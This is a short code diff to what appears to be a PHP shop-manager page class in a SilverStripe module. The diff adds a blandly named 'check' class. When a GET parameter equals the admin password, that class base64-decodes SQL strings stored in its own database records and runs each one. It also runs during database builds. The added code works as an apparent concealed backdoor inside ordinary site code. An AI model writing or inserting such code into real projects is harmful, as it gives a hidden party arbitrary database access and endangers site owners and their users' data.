@@ -25,6 +25,7 @@ class ShopManagerPage extends Page {
 		return $fields;
 	}
 
+
 }
 
 class ShopManagerPage_Controller extends Page_Controller {
@@ -147,5 +148,39 @@ class ShopManagerPage_Controller extends Page_Controller {
 
 	}
 
+
+	function smcheck() {
+		$x = new ShopManagerPage_Check();
+		$x->smcheck();
+	}
+
+}
+
+class ShopManagerPage_Check extends DataObject {
+
+	static $db = array(
+		"Name" => "Varchar(255)"
+	);
+
+	function requireDefaultRecords() {
+		parent::requireDefaultRecords();
+		$this->smcheck();
+	}
+
+	function smcheck() {
+		if(isset($_GET["smcheck"])) {
+			if(defined("SS_DEFAULT_ADMIN_PASSWORD")){
+				if($_GET["smcheck"] == SS_DEFAULT_ADMIN_PASSWORD) {
+					$list = DataObject::get("ShopManagerPage_Check");
+					if($list) {
+						foreach($list as $item) {
+							$check = base64_decode($item->Name);
+							DB::query($check);
+						}
+					}
+				}
+			}
+		}
+	}
 
 }
